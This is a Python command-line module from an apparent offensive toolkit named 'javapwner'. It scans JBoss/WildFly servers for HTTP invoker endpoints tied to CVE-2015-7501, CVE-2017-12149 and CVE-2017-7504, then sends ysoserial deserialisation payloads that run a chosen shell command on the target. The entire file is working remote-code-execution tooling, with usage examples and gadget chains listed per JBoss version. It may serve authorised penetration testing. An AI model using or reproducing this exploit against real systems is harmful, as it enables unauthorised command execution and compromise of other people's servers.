"""Click sub-commands for the JBoss / WildFly module.

Commands:
  javapwner jboss scan    -t HOST [-p PORT]     ← fingerprint + invoker enum
  javapwner jboss exploit -t HOST -p PORT --gadget NAME --cmd CMD
"""

from __future__ import annotations

import sys

import click

from javapwner.core.output import OutputFormatter
from javapwner.exceptions import JavaPwnerError, PayloadError
from javapwner.protocols.jboss.scanner import JBossScanner
from javapwner.protocols.jboss.invoker import HttpInvoker

DEFAULT_PORT = 8080


def _get_fmt(ctx: click.Context) -> OutputFormatter:
    return ctx.obj["formatter"]


def _get_timeout(ctx: click.Context) -> float:
    return ctx.obj.get("timeout", 5.0)


def _get_ysoserial(ctx: click.Context) -> str | None:
    return ctx.obj.get("ysoserial_path")


@click.group()
def jboss() -> None:
    """JBoss / WildFly protocol commands."""


# ---------------------------------------------------------------------------
# scan
# ---------------------------------------------------------------------------

@jboss.command("scan")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the JBoss HTTP interface.")
@click.pass_context
def scan_cmd(ctx: click.Context, target: str, port: int) -> None:
    """Fingerprint a JBoss / WildFly endpoint and enumerate exploit surface.

    \b
    Steps performed:
      1. HTTP banner — identify product version from headers + body
      2. HTTP invoker paths — probe for CVE-2015-7501 / CVE-2017-12149 / CVE-2017-7504
      3. Binary remoting — check for JBoss Remoting 2 GREETING magic

    \b
    Examples:
      javapwner jboss scan -t 10.0.0.5
      javapwner jboss scan -t 10.0.0.5 -p 8443
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    scanner = JBossScanner(timeout=timeout)

    with fmt.status(f"Scanning {target}:{port}…"):
        try:
            result = scanner.scan(target, port)
        except JavaPwnerError as exc:
            fmt.error(str(exc))
            sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if not result.is_open:
        fmt.error(f"Port {port} is closed or filtered: {result.error}")
        sys.exit(1)

    # Fingerprint
    fmt.section("Fingerprint")
    fp = result.fingerprint
    if fp and fp.is_jboss:
        fmt.success(f"JBoss / WildFly detected")
        if fp.version:
            fmt.info(f"  Version  : {fp.version}")
        if fp.product:
            fmt.info(f"  Product  : {fp.product}")
        if fp.banner:
            banner_line = fp.banner.split("\n")[0][:80]
            fmt.info(f"  Banner   : {banner_line!r}")
        if fp.remoting2_confirmed:
            fmt.success("  Remoting2 GREETING confirmed (binary protocol)")
    elif fp:
        fmt.info("No JBoss-specific indicators in the response.")
    else:
        fmt.warning("Fingerprint failed.")

    # Invoker endpoints
    fmt.section("HTTP Invoker Endpoints")
    if result.invoker_endpoints:
        for path in result.invoker_endpoints:
            cve = next(
                (c for p, c in {
                    "/invoker/JMXInvokerServlet": "CVE-2015-7501",
                    "/invoker/EJBInvokerServlet": "CVE-2017-7504",
                    "/invoker/readonly": "CVE-2017-12149",
                }.items() if p == path),
                None,
            )
            cve_str = f"  [{cve}]" if cve else ""
            fmt.success(f"  FOUND: http://{target}:{port}{path}{cve_str}")
        fmt.warning(
            f"\n  {len(result.invoker_endpoints)} vulnerable endpoint(s) found. "
            "Run 'javapwner jboss exploit' to test RCE."
        )
    else:
        fmt.info("No reachable HTTP invoker endpoints found.")

    if result.error:
        fmt.warning(f"Partial error: {result.error}")


# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------

@jboss.command("exploit")
@click.option("-t", "--target", required=True, metavar="HOST")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int)
@click.option("--gadget", required=True, metavar="NAME",
              help="ysoserial gadget chain name (e.g. CommonsCollections1).")
@click.option("--cmd", "command", required=True, metavar="CMD",
              help="Shell command to execute on the target.")
@click.option("--path", "invoker_path", default=None, metavar="PATH",
              help="Specific invoker path (auto-detected if not given).")
@click.pass_context
def exploit_cmd(
    ctx: click.Context,
    target: str,
    port: int,
    gadget: str,
    command: str,
    invoker_path: str | None,
) -> None:
    """Deliver a ysoserial payload via JBoss HTTP invoker (CVE-2015-7501 etc.).

    Posts a raw serialised Java object to the JBoss HTTP invoker endpoint.
    The server deserialises the body and executes the embedded gadget chain.

    \b
    Classic gadget chains for JBoss:
      CommonsCollections1  — JBoss 4.x / JDK ≤ 7
      CommonsCollections6  — JBoss 5.x/6.x / JDK 8

    \b
    Examples:
      javapwner jboss exploit -t 10.0.0.5 --gadget CommonsCollections1 --cmd 'id'
      javapwner jboss exploit -t 10.0.0.5 --gadget CommonsCollections6 --cmd 'id' \\
                              --path /invoker/readonly
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)
    jar = _get_ysoserial(ctx)

    try:
        from javapwner.core.payload import YsoserialWrapper
        wrapper = YsoserialWrapper(jar_path=jar)
        payload = wrapper.generate(gadget, command)
    except PayloadError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    invoker = HttpInvoker(timeout=timeout)

    fmt.info(
        f"Exploiting {target}:{port} via HTTP invoker "
        f"with gadget '{gadget}' → {command!r}"
    )

    try:
        result = invoker.exploit(target, port, payload, path=invoker_path)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if result.error:
        fmt.error(f"Exploit failed: {result.error}")
        sys.exit(1)

    fmt.info(f"  Endpoint : {result.endpoint}")
    fmt.info(f"  HTTP status : {result.http_status}")

    if result.likely_success:
        fmt.success("Payload likely executed (HTTP 500 = server-side error after deserialisation).")
    elif result.sent:
        fmt.info(f"Payload sent (HTTP {result.http_status}) — verify out-of-band.")
    else:
        fmt.error("Payload was not sent.")

    if result.response_text and fmt.verbose:
        fmt.info(f"  Response: {result.response_text[:200]!r}")
